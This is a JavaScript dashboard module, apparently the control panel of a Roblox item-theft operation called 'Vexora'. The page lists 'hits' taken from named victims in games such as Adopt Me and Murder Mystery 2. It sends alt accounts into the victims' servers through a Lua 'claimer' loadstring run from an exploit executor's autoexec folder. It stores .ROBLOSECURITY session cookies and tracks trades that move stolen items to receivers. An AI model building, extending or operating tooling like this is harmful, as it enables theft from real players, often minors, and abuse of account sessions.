import { api } from './api.js';
import { icon, esc, nf, money, timeAgo, stamp, toast, copyText } from './ui.js';

const GAMES = {
  mm2: 'Murder Mystery 2',
  adm: 'Adopt Me',
  baddies: 'Baddies',
  gag2: 'Grow a Garden 2',
  sab: 'Steal a Brainrot',
};

const BADGE = {
  new: 'game',
  ignored: 'game',
  queued: 'pending',
  joining: 'partial',
  joined: 'claimed',
  failed: 'missed',
  expired: 'missed',
  skipped: 'missed',
};

const head = (title, subtitle) => `
  <div class="page-head">
    <div class="titles">
      <div class="eyebrow">Vexora</div>
      <h1>${esc(title)}</h1>
      <p>${esc(subtitle)}</p>
    </div>
  </div>`;

const ago = (ts) => (timeAgo(ts) === 'now' ? 'just now' : `${timeAgo(ts)} ago`);

const serverUrl = (row) => (row.place_id && row.server_id
  ? `https://www.roblox.com/games/start?placeId=${row.place_id}&gameInstanceId=${encodeURIComponent(row.server_id)}`
  : null);

const serverCell = (row) => {
  const url = serverUrl(row);
  return url
    ? `<a class="cell-sub" href="${esc(url)}" target="_blank" rel="noopener noreferrer">${esc(String(row.server_id).slice(0, 10))}…</a>`
    : '<span class="cell-sub">none</span>';
};

export async function claimer(root) {
  let data = null;

  root.innerHTML = `${head('Auto joiner', 'Latest hits land here. Flip the joiner on and the SSS claimer takes the alt into that server.')}
    <div class="stack">
      <div class="grid-2">
        <div class="card">
          <div class="card-head">
            <div><h2>Auto joiner</h2><p>Master switch for sending an alt into a hit.</p></div>
            <div class="right">
              <label class="switch">
                <input type="checkbox" id="joiner-on" />
                <span class="track"></span>
                <span class="label">Armed</span>
              </label>
            </div>
          </div>
          <div class="card-body stack">
            <div class="kv" id="runtime-kv"></div>
            <label class="switch">
              <input type="checkbox" id="auto-join" />
              <span class="track"></span>
              <span class="label">Auto-join latest hits</span>
            </label>
            <label class="switch">
              <input type="checkbox" id="auto-arm" />
              <span class="track"></span>
              <span class="label">Turn on automatically when a hit lands</span>
            </label>
            <div class="field">
              <label>Only join above value</label>
              <input class="input" id="claim-min" type="number" min="0" step="1" value="0" />
            </div>
            <div class="field">
              <label>Phone API base</label>
              <input class="input mono" id="api-base" placeholder="http://192.168.1.20:5175" />
              <span class="hint" id="api-hint">The address the phone uses to reach this dashboard.</span>
            </div>
            <button class="btn" id="save-joiner">Save joiner settings</button>
          </div>
        </div>

        <div class="card">
          <div class="card-head">
            <div><h2>SSS auto claimer</h2><p>The Lua poller on the always-on alt.</p></div>
            <div class="right">
              <button class="btn btn-sm" id="copy-claimer">${icon('copy', 13)} Copy loadstring</button>
            </div>
          </div>
          <div class="card-body stack">
            <div class="code-block" id="claimer-line">loading…</div>
            <div class="kv" id="script-kv"></div>
            <p class="hint">Keep it in the executor's autoexec folder so it starts again after every teleport. It polls this dashboard with your API key and teleports into the newest target.</p>
          </div>
        </div>
      </div>

      <div class="card">
        <div class="card-head">
          <div><h2>Latest hits</h2><p>Real captures with a live server. Join sends the alt; auto-join does it the moment one lands.</p></div>
          <div class="right">
            <button class="btn btn-sm btn-primary" id="arm-hits">Turn on auto joiner</button>
            <span class="badge game" id="hit-count">0</span>
          </div>
        </div>
        <div class="card-body" style="padding:0">
          <div class="table-wrap">
            <table>
              <thead><tr>
                <th>Time</th><th>Item</th><th>Victim</th><th class="num">Value</th>
                <th>Game</th><th>Server</th><th>Status</th><th></th>
              </tr></thead>
              <tbody id="hits"><tr><td colspan="8"><div class="skeleton" style="height:90px"></div></td></tr></tbody>
            </table>
          </div>
        </div>
      </div>

      <div class="card">
        <div class="card-head">
          <div><h2>Receiver trades</h2><p>What the client does when a receiver joins: request, offer, confirm. A probe row means it could not read the inventory or the trade window.</p></div>
          <div class="right"><span class="badge game" id="trade-count">0</span></div>
        </div>
        <div class="card-body" style="padding:0">
          <div class="table-wrap">
            <table>
              <thead><tr>
                <th>Time</th><th>Receiver</th><th>Stage</th><th>Items</th><th>Server</th><th>Note</th>
              </tr></thead>
              <tbody id="trades"><tr><td colspan="6"><div class="skeleton" style="height:70px"></div></td></tr></tbody>
            </table>
          </div>
        </div>
      </div>

      <div class="card">
        <div class="card-head">
          <div><h2>Claim queue</h2><p>Every target the joiner knows about.</p></div>
          <div class="right"><button class="btn btn-sm" id="clear-queue">Clear finished</button></div>
        </div>
        <div class="card-body" style="padding:0">
          <div class="table-wrap">
            <table>
              <thead><tr>
                <th>Time</th><th>Target</th><th>Game</th><th class="num">Value</th>
                <th>Server</th><th>Status</th><th>Alt</th><th></th>
              </tr></thead>
              <tbody id="queue"><tr><td colspan="8"><div class="skeleton" style="height:90px"></div></td></tr></tbody>
            </table>
          </div>
        </div>
      </div>

      <div class="grid-2">
        <div class="card" id="engine-card">
          <div class="card-head">
            <div><h2>Desktop engine (optional)</h2><p>Launches Roblox on this PC instead of the phone.</p></div>
          </div>
          <div class="card-body stack">
            <label class="switch">
              <input type="checkbox" id="engine-enabled" />
              <span class="track"></span>
              <span class="label">Launch Roblox on this PC</span>
            </label>
            <div class="field">
              <label>Executor autoexec folder</label>
              <input class="input mono" id="autoexec-path" placeholder="C:\\Users\\you\\AppData\\Local\\Wave\\autoexec" />
              <span class="hint" id="autoexec-hint">Written before each launch so the client runs on join.</span>
            </div>
            <label class="switch">
              <input type="checkbox" id="autoexec-on" />
              <span class="track"></span>
              <span class="label">Seed autoexec on every join</span>
            </label>
            <button class="btn" id="save-engine">Save engine settings</button>
          </div>
        </div>

        <div class="card">
          <div class="card-head">
            <div><h2>Claimer accounts</h2><p>Only needed for the desktop engine.</p></div>
            <div class="right"><span class="badge game" id="account-count">0 / 5</span></div>
          </div>
          <div class="card-body stack">
            <div class="table-wrap">
              <table>
                <thead><tr><th>Alt</th><th>Status</th><th>Cookie</th><th>Last join</th><th></th></tr></thead>
                <tbody id="accounts"><tr><td colspan="5"><div class="skeleton" style="height:50px"></div></td></tr></tbody>
              </table>
            </div>
            <div class="field">
              <label>Add an alt</label>
              <input class="input" id="acc-user" placeholder="Roblox username (optional)" autocomplete="off" />
              <input class="input mono" id="acc-cookie" placeholder="_|WARNING... paste the whole .ROBLOSECURITY value" autocomplete="off" />
            </div>
            <button class="btn" id="add-account">Add account</button>
          </div>
        </div>
      </div>
    </div>`;

  const $ = (sel) => root.querySelector(sel);

  const paint = (next) => {
    const first = data === null;
    data = next;

    const runtime = data.runtime;
    const online = Boolean(runtime && Date.now() - runtime.at < 15_000);
    const stateLabel = online ? 'online' : (runtime ? `offline · ${ago(runtime.at)}` : 'never connected');

    $('#joiner-on').checked = data.enabled;
    $('#engine-enabled').checked = data.engine_enabled;
    // the cloud build has no local Roblox client: hide the launcher card
    const engineCard = $('#engine-card');
    if (engineCard) engineCard.hidden = Boolean(data.cloud);
    if (first) {
      $('#auto-join').checked = data.auto_join;
      $('#auto-arm').checked = data.auto_arm;
      $('#autoexec-on').checked = data.autoexec;
      $('#autoexec-path').value = data.autoexec_path ?? '';
      $('#claim-min').value = data.min_value ?? 0;
      $('#api-base').value = data.api?.override ?? '';
      const detected = data.detected_paths ?? [];
      $('#autoexec-hint').textContent = detected.length
        ? `Detected on this machine: ${detected[0]}`
        : 'No executor autoexec folder detected — paste the path by hand.';
    }

    $('#runtime-kv').innerHTML = `
      <div><span>Phone</span><b>${online ? 'online' : 'offline'}</b></div>
      <div><span>Last poll</span><b>${stateLabel}</b></div>
      <div><span>State</span><b>${runtime ? esc(runtime.state) : '—'}</b></div>
      <div><span>Account</span><b>${runtime?.account ? esc(runtime.account) : '—'}</b></div>
      <div><span>Server</span><b>${runtime?.server ? esc(String(runtime.server).slice(0, 10)) + '…' : '—'}</b></div>
      <div><span>Running</span><b>${nf(data.queue.queued)} queued · ${nf(data.queue.joined_today)} joined today</b></div>
      ${runtime?.error ? `<div><span>Error</span><b style="color:#fda4a4">${esc(runtime.error)}</b></div>` : ''}`;

    const api = data.api ?? {};
    const lan = (api.lan ?? []).filter(Boolean);
    $('#api-hint').textContent = api.override
      ? `Phones use ${api.base_url}. Start the server with HOST=0.0.0.0 so the network can reach it.`
      : (api.loopback
        ? `Local only — a phone cannot reach 127.0.0.1. Try ${lan[0] ?? `http://<your-lan-ip>:${api.port ?? 5175}`} or http://10.0.2.2:${api.port ?? 5175} (Android emulator), and start the server with HOST=0.0.0.0.`
        : `Reachable at ${api.base_url}.`);

    $('#claimer-line').textContent = data.script?.loadstring ?? 'unavailable';
    $('#script-kv').innerHTML = `
      <div><span>Version</span><b>${runtime?.rev ? esc(runtime.rev) : '—'}</b></div>
      <div><span>API base</span><b>${esc(api.base_url ?? '—')}</b></div>
      <div><span>Reach</span><b>${api.loopback ? 'local only' : 'network'}</b></div>
      <div><span>Last seen</span><b>${runtime ? ago(runtime.at) : 'never'}</b></div>`;

    $('#hit-count').textContent = `${data.hits.length}`;
    $('#arm-hits').style.display = data.enabled ? 'none' : '';
    $('#hits').innerHTML = data.hits.length
      ? data.hits.map((h) => {
        const actionable = h.usable && h.fresh && (h.status === 'new' || ['failed', 'expired', 'skipped'].includes(h.status));
        return `
        <tr>
          <td>${stamp(h.created_at)}</td>
          <td><b>${esc(h.item)}</b>${h.requester ? `<div class="cell-sub">by ${esc(h.requester)}</div>` : ''}</td>
          <td>${esc(h.victim ?? 'unknown')}</td>
          <td class="num">${money(h.value)}</td>
          <td>${esc(GAMES[h.game] ?? h.game)}</td>
          <td>${serverCell(h)}</td>
          <td><span class="badge ${BADGE[h.status] ?? 'game'}">${esc(h.status)}</span>${h.error ? `<div class="cell-sub">${esc(h.error)}</div>` : ''}</td>
          <td class="num">${actionable
            ? `<button class="btn btn-sm" data-hit="${esc(h.id)}">Join</button>`
            : (h.usable
              ? `<span class="cell-sub">${!h.fresh ? 'stale' : h.status === 'joined' ? 'joined' : 'queued'}</span>`
              : '<span class="cell-sub">not a target</span>')}</td>
        </tr>`;
      }).join('')
      : '<tr><td colspan="8"><div class="empty"><strong>No joinable hits yet</strong><span>The sealer has to capture an item from a real player; inventory dumps and selftests never show up here.</span></div></td></tr>';

    $('#queue').innerHTML = data.jobs.length
      ? data.jobs.map((j) => {
        const done = j.status === 'joined' || j.status === 'skipped';
        return `
        <tr>
          <td>${stamp(j.created_at)}</td>
          <td><b>${esc(j.item)}</b><div class="cell-sub">${esc(j.victim ?? 'unknown')}</div></td>
          <td>${esc(GAMES[j.game] ?? j.game)}</td>
          <td class="num">${money(j.value)}</td>
          <td>${serverCell(j)}</td>
          <td><span class="badge ${BADGE[j.status] ?? 'game'}">${esc(j.status)}</span>${j.error ? `<div class="cell-sub">${esc(j.error)}</div>` : ''}</td>
          <td>${j.account_name ? esc(j.account_name) : '<span class="cell-sub">—</span>'}</td>
          <td class="num">
            ${done ? '' : `<button class="btn btn-sm" data-join="${esc(j.id)}">Join now</button>`}
            ${done ? '' : `<button class="btn btn-sm btn-icon" data-skip="${esc(j.id)}" title="Skip">${icon('x', 12)}</button>`}
          </td>
        </tr>`;
      }).join('')
      : '<tr><td colspan="8"><div class="empty"><strong>Queue is empty</strong><span>Targets are added automatically as hits land.</span></div></td></tr>';

    const STAGE = {
      engine: 'game', receiver_joined: 'pending', request: 'pending', window: 'partial',
      offer: 'partial', confirm: 'partial', waiting: 'pending', done: 'claimed', no_window: 'missed',
      probe: 'missed', inventory_unreadable: 'missed',
    };
    const trades = data.trades ?? [];
    $('#trade-count').textContent = `${trades.length}`;
    $('#trades').innerHTML = trades.length
      ? trades.map((t) => {
        const items = t.items ?? [];
        return `
        <tr>
          <td>${stamp(t.at)}</td>
          <td><b>${esc(t.receiver)}</b>${t.roblox_user ? `<div class="cell-sub">from ${esc(t.roblox_user)}</div>` : ''}</td>
          <td><span class="badge ${STAGE[t.stage] ?? 'game'}">${esc(t.stage)}</span></td>
          <td>${items.length
            ? `<div class="chips">${items.slice(0, 5).map((i) => `<span class="chip">${esc(i)}</span>`).join('')}${items.length > 5 ? `<span class="chip">+${items.length - 5}</span>` : ''}</div>`
            : '<span class="cell-sub">—</span>'}</td>
          <td>${serverCell(t)}</td>
          <td><span class="cell-sub">${esc(t.detail ?? GAMES[t.game] ?? '')}</span></td>
        </tr>`;
      }).join('')
      : '<tr><td colspan="6"><div class="empty"><strong>No trade stages yet</strong><span>Add a receiver on My script, run the client, then join with that account. Every stage lands here.</span></div></td></tr>';

    $('#account-count').textContent = `${data.accounts.length} / ${data.engine.accounts_limit}`;
    $('#accounts').innerHTML = data.accounts.length
      ? data.accounts.map((a) => `
        <tr>
          <td><b>${esc(a.username)}</b></td>
          <td><span class="badge ${a.status === 'ready' ? 'claimed' : a.status === 'invalid' ? 'missed' : 'pending'}">${esc(a.status)}</span></td>
          <td class="mono">${esc(a.cookie_mask ?? '••••')}</td>
          <td>${a.last_join ? ago(a.last_join) : '<span class="cell-sub">never</span>'}</td>
          <td class="num"><button class="btn btn-sm btn-icon" data-remove-account="${esc(a.id)}" title="Remove">${icon('trash', 12)}</button></td>
        </tr>`).join('')
      : '<tr><td colspan="5"><div class="empty"><strong>No accounts</strong><span>Only needed if you want the desktop engine to launch Roblox.</span></div></td></tr>';
  };

  const refresh = async () => {
    try {
      paint(await api.claimer());
    } catch (err) {
      if (err.status === 401 || err.status === 403) toast(err.message ?? 'Not allowed', 'error');
    }
  };

  const run = async (btn, fn) => {
    const label = btn?.textContent;
    if (btn) { btn.disabled = true; btn.textContent = 'Working…'; }
    try {
      const res = await fn();
      if (res) paint(res);
      return res;
    } catch (err) {
      toast(err.message ?? 'That did not work', 'error');
      return null;
    } finally {
      if (btn) { btn.disabled = false; btn.textContent = label; }
    }
  };

  $('#arm-hits').addEventListener('click', async (e) => {
    const res = await run(e.currentTarget, () => api.saveClaimer({ enabled: true }));
    if (res) toast('Auto joiner armed', 'success');
  });

  $('#copy-claimer').addEventListener('click', async () => {
    const ok = await copyText($('#claimer-line').textContent);
    toast(ok ? 'Claimer loadstring copied' : 'Copy failed', ok ? 'success' : 'error');
  });

  $('#joiner-on').addEventListener('change', async (e) => {
    const res = await run(null, () => api.saveClaimer({ enabled: e.target.checked }));
    if (!res) e.target.checked = !e.target.checked;
    else toast(res.enabled ? 'Auto joiner armed' : 'Auto joiner off', 'success');
  });

  $('#engine-enabled').addEventListener('change', async (e) => {
    const res = await run(null, () => api.saveClaimer({ engine_enabled: e.target.checked }));
    if (!res) e.target.checked = !e.target.checked;
    else toast(res.engine_enabled ? 'Desktop engine on' : 'Desktop engine off', 'success');
  });

  $('#auto-join').addEventListener('change', async (e) => {
    const res = await run(null, () => api.saveClaimer({ auto_join: e.target.checked }));
    if (!res) e.target.checked = !e.target.checked;
    else toast(res.auto_join ? 'Auto-join on' : 'Auto-join off', 'success');
  });

  $('#auto-arm').addEventListener('change', async (e) => {
    const res = await run(null, () => api.saveClaimer({ auto_arm: e.target.checked }));
    if (!res) e.target.checked = !e.target.checked;
    else toast(res.auto_arm ? 'Will arm itself on the next hit' : 'Auto-arm off', 'success');
  });

  $('#save-joiner').addEventListener('click', async (e) => {
    const res = await run(e.currentTarget, () => api.saveClaimer({
      min_value: Number($('#claim-min').value) || 0,
      api_base: $('#api-base').value.trim(),
    }));
    if (res) toast('Joiner settings saved', 'success');
  });

  $('#save-engine').addEventListener('click', async (e) => {
    const res = await run(e.currentTarget, () => api.saveClaimer({
      autoexec: $('#autoexec-on').checked,
      autoexec_path: $('#autoexec-path').value.trim(),
    }));
    if (res) toast('Engine settings saved', 'success');
  });

  $('#add-account').addEventListener('click', async (e) => {
    const cookie = $('#acc-cookie').value.trim();
    if (!cookie) return toast('Paste the alt cookie first', 'error');
    const res = await run(e.currentTarget, () => api.addClaimerAccount({
      cookie,
      username: $('#acc-user').value.trim() || undefined,
    }));
    if (!res) return;
    $('#acc-cookie').value = '';
    $('#acc-user').value = '';
    if (res.warning) toast(res.warning, 'error');
    else toast('Claimer account added', 'success');
  });

  root.querySelector('#hits').addEventListener('click', async (e) => {
    const btn = e.target.closest('[data-hit]');
    if (!btn) return;
    const res = await run(btn, () => api.joinHit(btn.dataset.hit));
    if (!res) return;
    toast(res.enabled ? 'Target queued for the joiner' : 'Target queued — arm the joiner to send the alt', res.enabled ? 'success' : 'error');
  });

  root.querySelector('#queue').addEventListener('click', async (e) => {
    const joinBtn = e.target.closest('[data-join]');
    if (joinBtn) {
      const res = await run(joinBtn, () => api.joinClaim(joinBtn.dataset.join));
      if (res) toast('Alt launched', 'success');
      return;
    }
    const skipBtn = e.target.closest('[data-skip]');
    if (skipBtn) {
      const res = await run(null, () => api.skipClaim(skipBtn.dataset.skip));
      if (res) toast('Target skipped');
    }
  });

  root.querySelector('#accounts').addEventListener('click', async (e) => {
    const btn = e.target.closest('[data-remove-account]');
    if (!btn) return;
    const res = await run(null, () => api.removeClaimerAccount(btn.dataset.removeAccount));
    if (res) toast('Account removed', 'success');
  });

  $('#clear-queue').addEventListener('click', async (e) => {
    const res = await run(e.currentTarget, () => api.clearClaims());
    if (res) toast(`${nf(res.removed)} cleared`);
  });

  paint(await api.claimer());
  const timer = setInterval(refresh, 4000);
  return () => clearInterval(timer);
}
